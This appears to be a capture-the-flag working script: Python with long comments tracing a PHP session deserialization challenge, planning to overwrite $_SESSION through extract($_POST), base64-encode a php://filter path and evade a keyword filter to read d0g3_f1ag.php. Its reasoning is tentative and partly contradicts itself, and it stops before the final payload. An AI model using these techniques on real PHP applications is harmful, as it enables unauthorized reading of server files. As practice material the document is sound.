# Let's trace through the serialization and filter process

# Simulating the PHP code:
# $_SESSION["user"] = 'guest';
# $_SESSION['function'] = $function;  # 'show_image'
# $_SESSION['img'] = base64_encode('guest_img.png');  # 'Z3Vlc3RfaW1nLnBuZw=='

# With extract($_POST), we can overwrite these
# If we POST _SESSION[img]=ZDBnM19mMWFnLnBocA==
# Then $_SESSION['img'] = 'ZDBnM19mMWFnLnBocA=='

# Serialized: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}

# Filter removes: php, flag, php5, php4, fl1g (case insensitive)
# The serialized string doesn't contain these keywords
# So it passes through unchanged

# Then unserialize gives us back the array with img = 'ZDBnM19mMWFnLnBocA=='
# file_get_contents(base64_decode('ZDBnM19mMWFnLnBocA==')) = file_get_contents('d0g3_f1ag.php')

# The file d0g3_f1ag.php contains:
# <?php echo 'hi,here you want to find me?'; ?>
# Or maybe it has the flag hidden in a comment or variable

# Let's try to read the file using php://filter to get the source code
# php://filter/read=convert.base64-encode/resource=d0g3_f1ag.php

import base64

# The php://filter path contains 'php' which will be filtered!
filter_path = "php://filter/read=convert.base64-encode/resource=d0g3_f1ag.php"
print(f"Filter path: {filter_path}")
print(f"Base64: {base64.b64encode(filter_path.encode()).decode()}")

# The base64 contains 'cGhw' which decodes to 'php'
# But the filter operates on the serialized string, not the decoded base64
# Let's check if 'php' appears in the base64 string

b64 = base64.b64encode(filter_path.encode()).decode()
print(f"\nBase64 encoded: {b64}")
print(f"Contains 'php': {'php' in b64.lower()}")

# Actually, the filter regex is: /php|flag|php5|php4|fl1g/i
# It matches the literal strings in the serialized data
# The base64 string "cGhwOi8vZmlsdGVy..." contains "cGhw" which doesn't match "php"

# Wait, but the serialized string would be:
# s:3:"img";s:XX:"cGhwOi8vZmlsdGVy..."

# The filter looks for 'php' in the serialized string
# 'cGhw' is not 'php', so it won't be filtered!

# Let me verify this works
print("\n--- Testing ---")
print(f"Base64 of php://filter path: {b64}")

# But wait, the filter path contains 'php' literally!
# In the serialized string, we'd have:
# s:XX:"php://filter/read=convert.base64-encode/resource=d0g3_f1ag.php"
# This DOES contain 'php' and would be filtered!

# So we need to use the filter bypass technique
# The trick is to use the length mismatch to inject our payload

